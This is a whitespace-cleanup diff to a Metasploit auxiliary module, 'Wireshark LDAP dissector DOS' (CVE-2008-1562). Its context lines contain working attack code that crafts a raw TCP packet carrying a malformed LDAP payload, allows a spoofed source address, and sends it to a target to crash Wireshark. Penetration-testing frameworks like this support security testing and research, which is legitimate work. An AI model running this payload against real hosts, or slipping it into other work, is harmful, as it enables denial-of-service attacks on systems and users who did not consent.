@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Capture
 	include Msf::Auxiliary::Dos
-			
+
 	def initialize
 		super(
 			'Name'        => 'Wireshark LDAP dissector DOS',
@@ -31,13 +31,13 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'CVE', '2008-1562' ],
 				],
-			'DisclosureDate' => 'Mar 28 2008')		
-			
+			'DisclosureDate' => 'Mar 28 2008')
+
 		register_options([
 			OptInt.new('RPORT', [true, 'The destination port', 389]),
 			OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
 		], self.class)
-	
+
 		deregister_options('FILTER','PCAPFILE')
 	end
 
@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Sending malformed LDAP packet to #{rhost}")
 
 		m = Rex::Text.rand_text_alpha_lower(3)
-		
+
 		open_pcap
 
 		n = Racket::Racket.new
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 		n.l3.protocol = 6
 		n.l3.id = rand(0x10000)
 		n.l3.ttl = 64
-		
+
 		n.l4 = Racket::L4::TCP.new
 		n.l4.src_port = rand(65535)+1
 		n.l4.seq = rand(0x100000000)
@@ -68,8 +68,8 @@ class Metasploit3 < Msf::Auxiliary
 		n.l4.window = 3072
 		n.l4.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
 
-		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')	
-	
+		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')
+
 		pkt = n.pack
 
 		capture_sendto(pkt, rhost)
